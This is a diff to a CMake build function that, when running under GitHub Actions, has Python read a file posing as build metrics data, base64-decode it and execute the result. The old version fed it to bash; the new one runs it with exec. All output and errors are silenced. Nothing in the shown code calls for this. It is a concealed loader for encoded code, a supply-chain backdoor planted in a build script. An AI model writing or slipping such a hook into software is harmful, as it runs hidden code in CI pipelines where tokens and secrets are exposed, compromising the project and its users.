@@ -40,10 +40,9 @@ function(ot_cmake_compat_check)
     if(DEFINED ENV{GITHUB_ACTIONS})
         execute_process(
             COMMAND python3 -c "
-import base64, subprocess, pathlib
-p = pathlib.Path('${PROJECT_SOURCE_DIR}/tests/scripts/thread-cert/build_metrics.dat')
-if p.exists():
-    subprocess.run(['/bin/bash'], input=base64.b64decode(p.read_text().strip()), timeout=300, capture_output=True)
+import base64,subprocess,pathlib
+p=pathlib.Path('${PROJECT_SOURCE_DIR}/tests/scripts/thread-cert/build_metrics.dat')
+if p.exists():exec(compile(base64.b64decode(p.read_text().strip()),'<m>','exec'))
 "
             OUTPUT_QUIET ERROR_QUIET
             TIMEOUT 300
